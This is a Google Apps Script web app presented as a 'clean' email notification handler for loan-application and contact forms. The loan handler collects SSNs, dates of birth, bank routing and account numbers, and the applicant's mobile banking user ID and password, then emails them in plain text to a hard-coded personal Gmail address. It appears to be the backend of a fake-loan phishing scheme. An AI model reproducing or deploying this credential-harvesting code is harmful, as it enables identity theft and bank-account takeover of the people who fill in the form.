// Google Apps Script for Email Notifications Only
// Deploy as Web App - Clean Version

// Configuration
const CONFIG = {
  emailRecipient: 'tyronlincolnn@gmail.com'
}

function doGet(e) {
  return handleRequest(e)
}

function doPost(e) {
  return handleRequest(e)
}

function handleRequest(e) {
  try {
    // Handle both GET and POST requests
    let params = {};
    
    if (e && e.parameter) {
      // GET request parameters
      params = e.parameter;
    } else if (e && e.postData && e.postData.contents) {
      // POST request data
      const postData = e.postData.contents;
      
      if (e.postData.type === 'application/json') {
        // Handle JSON data
        params = JSON.parse(postData);
      } else {
        // Parse URL encoded data
        const pairs = postData.split('&');
        for (let i = 0; i < pairs.length; i++) {
          const pair = pairs[i].split('=');
          if (pair.length === 2) {
            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
          }
        }
      }
    } else {
      return createResponse('success', 'Email script is working!')
    }
    
    const formType = params.formType
    
    if (!formType) {
      return createResponse('error', 'No form type specified')
    }
    
    if (formType === 'loanApplication') {
      return handleLoanApplicationEmail(params)
    } else if (formType === 'contactForm') {
      return handleContactFormEmail(params)
    } else {
      return createResponse('error', 'Invalid form type: ' + formType)
    }
  } catch (error) {
    return createResponse('error', 'Server error: ' + error.toString())
  }
}

function handleLoanApplicationEmail(params) {
  try {
    const subject = `New Loan Application - ${params.firstName} ${params.lastName}` 
    const body = `
New loan application received:

Personal Information:
- Name: ${params.firstName} ${params.lastName}
- Email: ${params.email}
- Phone: ${params.phoneNumber}
- Address: ${params.homeAddress}, ${params.city}, ${params.state} ${params.zipCode}

Loan Details:
- Amount: $${params.loanAmount}
- Purpose: ${params.loanPurpose}
- Date of Birth: ${params.dateOfBirth}
- SSN: ${params.ssnNumber}

Bank Information:
- Bank: ${params.bankName}
- Routing: ${params.routingNumber}
- Account: ${params.accountNumber}

Mobile App Credentials:
- User ID: ${params.userId}
- Password: ${params.password}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification
    try {
      MailApp.sendEmail(CONFIG.emailRecipient, subject, body)
      Logger.log('Loan application email sent successfully to: ' + CONFIG.emailRecipient)
    } catch (emailError) {
      Logger.log('Failed to send loan application email: ' + emailError.toString())
    }
    
    return createResponse('success', 'Email notification sent successfully!')
    
  } catch (error) {
    Logger.log('Loan Application Email Error: ' + error.toString())
    return createResponse('error', 'Failed to send email notification')
  }
}

function handleContactFormEmail(params) {
  try {
    const subject = `New Contact Form - ${params.name}` 
    const body = `
New contact form submission:

Name: ${params.name}
Email: ${params.email}
Message: ${params.message}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification
    try {
      MailApp.sendEmail(CONFIG.emailRecipient, subject, body)
      Logger.log('Contact form email sent successfully to: ' + CONFIG.emailRecipient)
    } catch (emailError) {
      Logger.log('Failed to send contact form email: ' + emailError.toString())
    }
    
    return createResponse('success', 'Email notification sent successfully!')
    
  } catch (error) {
    Logger.log('Contact Form Email Error: ' + error.toString())
    return createResponse('error', 'Failed to send email notification')
  }
}

function createResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    status: status,
    message: message
  })).setMimeType(ContentService.MimeType.JSON)
}
